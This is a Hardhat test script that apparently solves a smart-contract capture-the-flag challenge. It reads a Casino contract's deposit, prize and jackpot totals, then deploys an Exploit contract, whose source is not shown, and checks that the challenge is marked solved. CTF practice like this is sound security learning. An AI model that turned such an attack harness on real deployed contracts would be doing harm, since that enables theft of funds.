import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_Baraa42, CHALLENGE_Baraa42} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let casino: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/Baraa42/Setup.sol:Setup`, SETUP_Baraa42)).connect(attacker);
    casino = await ethers.getContractAt(`contracts/Baraa42/Casino.sol:Casino`, setup.casino());
});

it("prints contract address", async function () {
    const addr = await casino.address;
    //expect(addr).to.eq(CHALLENGE_Baraa42);
});

it("info", async function () {
    console.log((await casino.totalDeposits()).toString());
    console.log((await casino.totalPrize()).toString());
    console.log((await casino.totalJackpot()).toString());
                
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/Baraa42/Exploit.sol:Exploit`, attacker)).deploy(casino.address, {value: 1});
    expect(await setup.isSolved()).to.eq(true);
    
});